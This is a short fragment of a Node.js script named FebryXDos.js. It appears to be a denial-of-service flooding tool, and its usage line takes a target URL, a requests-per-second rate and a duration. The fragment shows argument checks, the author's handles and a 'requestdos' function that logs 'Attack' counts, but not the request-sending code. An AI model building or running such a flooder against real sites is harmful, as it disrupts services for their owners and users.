...
if (!url || !Rate || !time) {
  console.log(`@febrykullbet || @sedihbetgw`)
  console.log(`Usage : node FebryXDos.js <url> <rps> <time>`);;
  process.exit(1);
}
...
function requestdos() {
    console.log(`Attack : ${target} | Total Request : ` + FebryEnsz);
    FebryEnsz++;
